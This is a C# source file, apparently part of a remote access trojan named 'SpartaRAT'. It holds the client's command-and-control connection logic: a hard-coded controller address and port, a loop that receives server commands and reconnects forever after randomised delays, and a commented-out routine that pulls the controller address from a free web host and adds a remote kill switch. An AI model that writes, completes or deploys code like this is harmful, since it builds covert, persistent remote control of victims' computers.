using System;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using RATclientSparta.Server;

namespace SpartaRATclient
{
    public class SocketServer
    {
        private static Socket SetSocket()
        {
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        private static IPEndPoint SetIpAddress()
        {
            /*
                        String GetIpAddress()
                        {
                            string ipaddress;
                            //WebClient site = new WebClient();
                            while (true)
                            {
                                try
                                {
                                    // ipaddress = site.DownloadString("https://mysimpleweb054.000webhostapp.com/mysite/detail"); //myproject054 - username
                                    ipaddress = "192.168.1.18"; //or change to anything else
                                    if (ipaddress == "")
                                        throw new Exception();
                                    else if (ipaddress == "close")
                                        Environment.Exit(0); //If i dont want the program to run anywhere
                                    break;
                                }
                                catch { Thread.Sleep(30000); }
                            }
                            return ipaddress;
                        }

                        return new IPEndPoint(IPAddress.Parse(GetIpAddress()), 81);*/
            return new IPEndPoint(IPAddress.Parse("172.0.2.131"), 81);
        }

        public void Connect()
        {
            Socket ServerSocketObject = SetSocket();
            IPEndPoint IPEndpoint = SetIpAddress();

            try
            {
                ServerSocketObject.Connect(IPEndpoint);
                ServerData server = new ServerData(ServerSocketObject);

                //reading data from server. when lost connection it will return and then Connect() again
                //Receive is a function at the "ServerData" class that reads data using TLV Protocol
                server.Receive();
            }
            catch
            {
                Random _ = new Random();
                Thread.Sleep(_.Next(30000, 60000));
            }
            Connect();
        }
    }
}